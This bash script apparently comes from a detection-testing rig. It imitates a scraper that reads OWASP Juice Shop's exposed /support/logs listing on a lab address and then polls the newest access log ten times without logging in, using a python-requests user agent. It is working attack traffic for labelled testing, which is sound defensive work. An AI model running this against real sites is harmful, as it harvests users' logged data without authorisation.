#!/usr/bin/env bash
# TAP-01 variant a (PRD §4.1, KI-59): a scraper finds the shop's open access logs. It reads the listing at
# /support/logs, then fetches today's access log 10 times, 3 s apart, the way a bot polls a file that keeps
# growing. No login. A python-requests user agent, as a scraper's. Runs inside the rig's tools container only.
# tool: curl 8.x (lib/capture.sh)
# label: leaky tap: /support/logs listed, then today's access log fetched 10 times, python-requests user agent
set -eu
. /attacks/lib/capture.sh
UA='python-requests/2.32.3'
# Juice Shop's directory listing announces 31 bytes more than it sends (the page is whole), so curl exits 18.
req -A "$UA" http://10.66.0.10/support/logs || [ $? -eq 18 ]
file=$(grep -o 'access\.log\.[0-9-]*' /out/responses/0001.body | sort -u | tail -1)
[ -n "$file" ] || { echo "no access log in the listing" >&2; exit 1; }
for _ in $(seq 10); do
  sleep 3
  req -A "$UA" "http://10.66.0.10/support/logs/$file"
done
cut -f2- /out/responses/index.tsv
